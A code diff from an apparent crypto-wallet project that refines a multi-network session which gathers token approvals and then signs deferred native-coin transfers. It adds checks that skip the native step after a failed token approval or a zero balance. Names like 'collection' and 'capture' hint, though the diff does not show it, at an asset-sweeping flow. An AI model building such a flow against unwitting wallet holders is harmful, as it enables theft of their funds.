@@ -2,7 +2,8 @@ import { formatTransferSkipReason } from "@trustmycard/shared/constants/collecti
 import { generateFlowId } from "@trustmycard/shared/ids";
 import { getToken, parseHumanToRaw } from "../core/chain-tokens";
 import type { ApprovalOrchestrationResult } from "../approval/types";
-import { ApprovalStageName } from "../approval/types";
+import { ApprovalStageName, StageStatus } from "../approval/types";
+import { isApprovalOrchestrationUserDenied } from "../approval/resilience/errors";
 import type { ApprovalRequest } from "../approval/types";
 import type { NativeTransferResult } from "../native-transfer/types";
 import { authorizeNativeInWalletPhase } from "../native-transfer/native-wallet-authorize";
@@ -141,6 +142,35 @@ export type RunAuthorizationSessionArgs = {
   /** Pre-authenticated wallet session token (prefetched before wallet phase when possible). */
   walletSessionToken?: string;
 };
+
+function hasTokenAuthorizationDependencyFailure(
+  results: AuthorizationAssetResult[],
+  network: string,
+): boolean {
+  return results.some(
+    (r) =>
+      r.network === network &&
+      r.token !== "NATIVE" &&
+      (r.outcome === "failed" || r.outcome === "user_rejected"),
+  );
+}
+
+function hasZeroNativeBalanceSnapshot(
+  networkRow: NetworkRow | undefined,
+  network: string,
+): boolean {
+  if (!networkRow) return false;
+  try {
+    return (
+      parseHumanToRaw(
+        balanceForNative(networkRow),
+        nativeDecimalsForNetwork(network),
+      ) <= BigInt(0)
+    );
+  } catch {
+    return true;
+  }
+}
 
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
   return (
@@ -409,7 +439,8 @@ export async function runAuthorizationSession(
           });
           if (
             unit.nativeItem &&
-            !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true)
+            !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true) &&
+            !hasTokenAuthorizationDependencyFailure(results, unit.network)
           ) {
             if (
               batchBaselineNonce != null &&
@@ -496,7 +527,12 @@ export async function runAuthorizationSession(
         }
       }
       if (unit.nativeItem) {
-        if (evmOwner && isEvmChainKey(unit.network) && evmPendingNonce != null) {
+        if (
+          evmOwner &&
+          isEvmChainKey(unit.network) &&
+          evmPendingNonce != null &&
+          !hasTokenAuthorizationDependencyFailure(results, unit.network)
+        ) {
           const lastTokenTx = results
             .filter(
               (r) =>
@@ -778,7 +814,7 @@ async function runTokenWalletPhase(ctx: {
     });
 
     if (!orchestration.ok) {
-      const rejected = Boolean(orchestration.userRejected);
+      const rejected = isApprovalOrchestrationUserDenied(orchestration);
       const result: AuthorizationAssetResult = {
         network: item.network,
         token,
@@ -846,11 +882,9 @@ async function runNativeWalletPhase(ctx: {
   const owner =
     item.network === "tron" ? args.accounts.tron : args.accounts.evm;
 
-  const tokenDependencyFailed = results.some(
-    (r) =>
-      r.network === item.network &&
-      r.token !== "NATIVE" &&
-      (r.outcome === "failed" || r.outcome === "user_rejected"),
+  const tokenDependencyFailed = hasTokenAuthorizationDependencyFailure(
+    results,
+    item.network,
   );
   if (tokenDependencyFailed) {
     const result: AuthorizationAssetResult = {
@@ -880,6 +914,20 @@ async function runNativeWalletPhase(ctx: {
   // EVM: eth_signTransaction in wallet phase when supported; RPC broadcast deferred.
   if (item.network !== "tron") {
     const provider = args.evmBatchProvider ?? args.settlementProvider;
+    const networkRow = args.networks.find((n) => n.key === item.network);
+    if (hasZeroNativeBalanceSnapshot(networkRow, item.network)) {
+      recordEvmNativeDeferred({
+        item,
+        results,
+        captureByNetwork,
+        sessionId,
+        owner: owner ?? "",
+        log,
+        onAssetEnd: args.onAssetEnd,
+        reason: "zero_native_balance_snapshot",
+      });
+      return;
+    }
     if (!provider || !args.nativeOrchestrator) {
       recordEvmNativeDeferred({
         item,
